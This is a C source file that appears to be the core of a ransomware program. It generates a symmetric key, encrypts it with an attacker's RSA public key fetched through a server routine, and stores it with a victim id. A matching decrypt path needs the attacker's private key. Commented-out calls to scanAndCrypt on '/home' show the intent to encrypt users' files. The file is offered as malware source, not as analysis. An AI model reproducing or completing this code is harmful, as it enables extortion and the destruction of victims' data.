#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "server.h"
#include "filescan.h"
#include "crypto.h"

void extractId(key_id *ki){
    FILE *k = fopen("public.pem", "rb");
    int id = 0; char ch;
    ch = fgetc(k);
    while(ch!='!'){
        id = id*10 + (ch-'0');
        ch = fgetc(k);
    }
    ki->id = id;
    ch = fgetc(k);
    int l = 0;
    while(!feof(k)){
        ki->key[l] = ch;
        l++;
        ch = fgetc(k);
    }
    fclose(k);
}

void encrypt(){
    key_id ki;
    getKeyId(&ki);
    unsigned char key[32];
    newKey(key);
    //scanAndCrypt("/home", key, true);
    unsigned char d[3000];
    public_encrypt(key, 32, ki.key, d);
    FILE *k = fopen("public.pem", "wb");
    fprintf(k, "%d!%s", ki.id, d);
    fclose(k);
    //printf("%d\n\n%s", kd.id, kd.key);
    //free(d);
}

bool existKey(){
    FILE *f = fopen("public.pem", "rb");
    if(f == NULL)
        return false;
    fclose(f);
    return true;
}

bool getKey(unsigned char *key){
    FILE *f = fopen("key.pem", "rb");
    if(f == NULL)
        return false;
    char ch;
    ch = fgetc(f);
    int l = 0;
    while(!feof(f)){
        key[l] = ch;
        l++;
        ch = fgetc(f);
    }
    fclose(f);
    return true;
}

void decrypt(){
    key_id ki;
    extractId(&ki);
    unsigned char key[3000];
    getKey(key);
    //newKey(key);
    //scanAndCrypt("/home", key, true);
    unsigned char d[32];
    private_decrypt(ki.key, 32, key, d);
    //scanAndCrypt("/home", d, false);
}

int main(int n, char *args[n]){
    encrypt();
}
